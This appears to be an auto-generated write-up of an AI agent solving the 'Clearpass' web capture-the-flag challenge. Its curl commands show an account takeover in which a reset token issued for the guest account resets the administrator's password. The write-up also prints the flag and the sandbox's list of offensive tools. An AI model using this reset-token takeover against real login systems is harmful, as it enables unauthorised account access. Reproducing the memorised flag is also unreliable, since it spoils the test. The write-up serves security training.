# Clearpass [EASY]

<!-- SCRIBE: replace this block with a 5-line 'what the trick was' intro. -->

- **Category**: WEB
- **Points**: 150
- **Solves**: 8
- **Flag**: `FLAG{unb0und-r3s3t-t0k3n-t4k30v3r}`
- **Winner**: `deepseek-flash`
- **Swarm cost**: $0.01 (winner $0.00)
- **Wall time**: 11m35s
- **Traces**: 2

## Adversarial description flags

- Flags: flag_claim
- Ground truth: Description flagged as adversarial. CTFd submit result and raw distfile bytes are authoritative. Description claims are hypotheses.

## Description

~~~
Clearpass is an account access portal. A demo account is provided; the flag belongs to the administrator.
Demo login: guest / guest123
**Flag format:** `FLAG{...}`
**Connection:** http://chal2.hackathon.ke:8004
~~~

## Trace

| Model | Status | Steps | Cost | Wall | Trace |
|---|---|---:|---:|---:|---|
| `deepseek-flash` | flag_found / CONFIRMED | 8 | $0.00 | 24s | `trace-Clearpass_[EASY]-deepseek-flash-20261029-115600.jsonl` |
| `deepseek-flash` | flag_found / CONFIRMED | 7 | $0.00 | 14s | `trace-Clearpass_[EASY]-deepseek-flash-20261029-120721.jsonl` |

_Window: 2026-10-29T11:56:01 to 2026-10-29T12:07:36_

## Solution path

### Step 1: `bash`
~~~
{
  "command": "ls -la /challenge/distfiles/; cat /tools.txt | head -50",
  "timeout_seconds": 60
}
~~~

~~~
CTF SANDBOX TOOLS REFERENCE
============================
All tools pre-installed in the sandbox. cat /tools.txt to view this file.

== NETWORKING ==
nc (netcat)        TCP/UDP connections. nc host port <<'EOF' for heredoc sessions.
curl               HTTP client. -s silent, -k skip TLS, -d data, -H header.
wget               HTTP download. wget -O file url.
nmap               Port scanner. nmap -sV host, nmap -p- host.
ffuf               Web fuzzer. ffuf -w wordlist -u http://host/FUZZ
gobuster           Directory/DNS/vhost brute force. gobuster dir -u http://host -w wordlist

== PASSWORD CRACKING ==
hashcat            GPU/CPU hash cracker. hashcat -m 0 -a 0 hashes.txt wordlist.txt
john               John the Ripper. john --wordlist=wordlist hashes.txt

== BINARY ANALYSIS ==
file               Identify file type. file binary
strings            Extract printable strings. strings -n 8 binary
xxd                Hex dump. xxd file | head, xxd -r to reverse.
hexdump            Hex dump. hexdump -C file.
binwalk            Firmware/embedded extraction. binwalk -e file to extract.
objdump            Disassembly. objdump -d binary (from binutils).
... [2000 chars total]
~~~

### Step 2: `bash`
~~~
{
  "command": "ls -la /challenge/; curl -s -i http://chal2.hackathon.ke:8004/ 2>&1 | head -50; echo; curl -s -i http://host.docker.internal:8004/ | head -40",
  "timeout_seconds": 60
}
~~~

~~~
total 8
drwxr-xr-x 1 root root 4096 Oct 29 08:56 .
drwxr-xr-x 1 root root 4096 Oct 29 08:56 ..
-rwxrwxrwx 1 root root  546 Oct 29 07:52 metadata.yml
drwxrwxrwx 1 root root 4096 Oct 29 08:56 workspace
HTTP/1.1 200 OK
Server: gunicorn
Date: Thu, 29 Oct 2026 08:56:05 GMT
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: 9274

<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Clearpass — Account</title>
<style>
  :root{--bg:#f4f6fb;--panel:#fff;--ink:#131a2b;--muted:#64708a;--line:#e5e9f2;
        --brand:#2563eb;--brand-ink:#1d4ed8;--brand-soft:#e4edff;--ok:#059669;
        --shadow:0 1px 2px rgba(16,24,40,.06),0 1px 3px rgba(16,24,40,.1);--radius:12px;}
  *{box-sizing:border-box}html,body{margin:0;height:100%}
  body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Inter,Helvetica,Arial,sans-serif;background:var(--bg);color:var(--ink);font-size:14px;line-height:1.5;-webkit-font-smoothing:antialiased}
  a{color:var(--brand);text-decoration:none;cursor:pointer}
  .brand{display:flex;align-items:center;gap:10px;font-weight:700;font-size:16px}
... [2000 chars total]
~~~

### Step 3: `bash`
~~~
{
  "command": "cat /challenge/metadata.yml; cd /challenge/workspace; curl -s http://chal2.hackathon.ke:8004/ > index.html; cat index.html | sed -n '40,400p'",
  "timeout_seconds": 60
}
~~~

~~~
version: beta1
name: Clearpass [EASY]
category: WEB
description: 'Clearpass is an account access portal. A demo account is provided; the
  flag belongs to the administrator.

  Demo login: guest / guest123

  **Flag format:** `FLAG{...}`

  **Connection:** http://chal2.hackathon.ke:8004'
value: 150
solves: 8
adversarial:
  flag_claim: true
ground_truth: Description flagged as adversarial. CTFd submit result and raw distfile
  bytes are authoritative. Description claims are hypotheses.
sanitized: true
sanitizer_version: 1
</style>
</head>
<body>
<!-- LOGIN / RESET -->
<section class="wrap" id="auth">
  <div class="auth">
    <div class="brand"><span class="logo">C</span> Clearpass</div>

    <div id="loginView">
      <h1>Sign in</h1><p class="sub">Account access portal.</p>
      <div class="field"><label>Username</label><input id="u" value="guest"></div>
      <div class="field"><label>Password</label><input id="p" type="password" placeholder="••••••••"></div>
      <div class="rowbetween" style="margin:6px 0 12px"><span></span><a id="forgot">Forgot password?</a></div>
      <button class="btn" id="signin">Sign in</button>
      <div class="err" id="loginErr"></div>
... [2000 chars total]
~~~

### Step 4: `bash`
~~~
{
  "command": "cd /challenge/workspace; curl -s -c c.txt -X POST http://chal2.hackathon.ke:8004/api/login -H 'Content-Type: application/json' -d '{\"username\":\"guest\",\"password\":\"guest123\"}'; echo; curl -s -X POST http://chal2.hackathon.ke:8004/api/reset/request -H 'Content-Type: application/json' -d '{\"username\":\"guest\"}'; echo; curl -s -X POST http://chal2.hackathon.ke:8004/api/reset/request -H 'Content-Type: application/json' -d '{\"username\":\"admin\"}'; echo",
  "timeout_seconds": 60
}
~~~

~~~
{"ok":true,"role":"user","user":"guest"}

{"issued_for":"guest","ok":true,"token":"l0vFfQ2uNPXAefJbAMNFwA"}

{"issued_for":"admin","ok":true,"token":"2WEvM5kOy5yfDI-SyMQoOA"}
~~~

### Step 5: `bash`
~~~
{
  "command": "cd /challenge/workspace; for i in 1 2 3; do curl -s -X POST http://chal2.hackathon.ke:8004/api/reset/request -H 'Content-Type: application/json' -d '{\"username\":\"admin\"}'; echo; done; python3 -c \"import base64;print(base64.urlsafe_b64decode('2WEvM5kOy5yfDI-SyMQoOA'+'=='))\"; curl -s -b c.txt http://chal2.hackathon.ke:8004/api/me; echo; curl -s -b c.txt http://chal2.hackathon.ke:8004/api/flag; echo",
  "timeout_seconds": 60
}
~~~

~~~
{"issued_for":"admin","ok":true,"token":"HGXsDbkT8WWveHa68P7fcA"}

{"issued_for":"admin","ok":true,"token":"vp9uKJ9Ej47g1PVlZushqg"}

{"issued_for":"admin","ok":true,"token":"N7i-IpU_1u55IiPK7LOvvg"}

b'\xd9a/3\x99\x0e\xcb\x9c\x9f\x0c\x8f\x92\xc8\xc4(8'
{"role":"user","user":"guest"}

{"error":"admins only"}
~~~

### Step 6: `bash`
~~~
{
... [1253 chars total]
~~~

~~~
T=nDMQnbJ864WcrzmqezHAQQ
TA=tAh7nOQ48cOhP5quRGFJMQ
-- use admin token for admin:
{"ok":true,"reset":"admin"}

-- use admin token for guest:
{"error":"invalid or expired token"}

-- use guest token for admin:
{"ok":true,"reset":"admin"}
~~~

### Step 7: `bash`
~~~
{
  "command": "cd /challenge/workspace; curl -s -c a.txt -X POST http://chal2.hackathon.ke:8004/api/login -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":\"pw3\"}'; echo; curl -s -b a.txt http://chal2.hackathon.ke:8004/api/me; echo; curl -s -b a.txt http://chal2.hackathon.ke:8004/api/flag; echo",
  "timeout_seconds": 60
}
~~~

~~~
{"ok":true,"role":"admin","user":"admin"}

{"role":"admin","user":"admin"}

{"flag":"FLAG{unb0und-r3s3t-t0k3n-t4k30v3r}"}
~~~

### Step 8: `submit_flag`
~~~
{
  "flag": "FLAG{unb0und-r3s3t-t0k3n-t4k30v3r}"
}
~~~

~~~
DRY RUN — would submit "FLAG{unb0und-r3s3t-t0k3n-t4k30v3r}" but --no-submit is set.
~~~

## Result

- **Flag**: `FLAG{unb0und-r3s3t-t0k3n-t4k30v3r}`
- **Confirmed by CTFd**: yes
- **Cost**: $0.00 (winner), $0.01 (whole swarm)
- **Wall time**: 11m35s
- **Generated**: 2026-10-30T00:14:54
